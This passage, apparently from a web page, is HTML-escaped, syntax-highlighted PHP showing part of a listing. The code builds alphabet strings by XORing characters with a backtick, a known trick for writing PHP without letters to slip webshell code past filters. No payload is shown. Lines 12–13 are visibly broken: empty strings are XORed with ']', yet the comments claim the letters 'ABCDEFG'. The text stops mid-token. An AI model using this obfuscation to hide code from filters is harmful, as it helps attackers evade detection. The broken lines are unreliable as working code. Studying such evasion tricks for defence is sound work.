class=&#34;token operator&#34;&gt;^&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;`&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;chr&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;13&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;`&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;chr&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;14&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;`&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;//hijklmn&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$f&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;chr&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;15&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;`&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;chr&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;16&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;`&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;chr&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;17&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;`&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;chr&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;18&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;`&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;chr&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;19&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;`&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;chr&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;20&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;`&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;//opqrst&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$g&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;chr&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;21&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;`&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;chr&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;22&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;`&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;chr&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;23&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;`&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;chr&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;24&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;`&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;chr&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;25&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;`&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;chr&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;26&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;`&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;//uvwxyz&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$h&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;!&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;`&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;&#34;&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;`&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;#&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;`&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;$&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;`&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;%&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;`&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;&amp;amp;&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;`&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;\&#39;&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;`&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;//ABCDEFG&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$i&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;(&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;`&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;)&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;`&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;*&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;`&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;+&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;`&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;,&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;`&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;-&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;`&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;.&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;`&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;//HIJKLMN&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$j&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;/&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;`&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;0&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;`&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;1&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;`&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;2&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;`&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;3&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;`&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;4&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;`&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;//OPQRST&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$k&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;5&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;`&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;6&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;`&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;7&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;`&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;8&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;`&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;9&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;`&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;:&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;`&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;//UVWXYZ&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$l&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;]&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;]&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;]&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;]&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;]&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;]&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;]&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;//ABCDEFG&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$m&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;]&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;]&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;]&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;]&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;]&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string 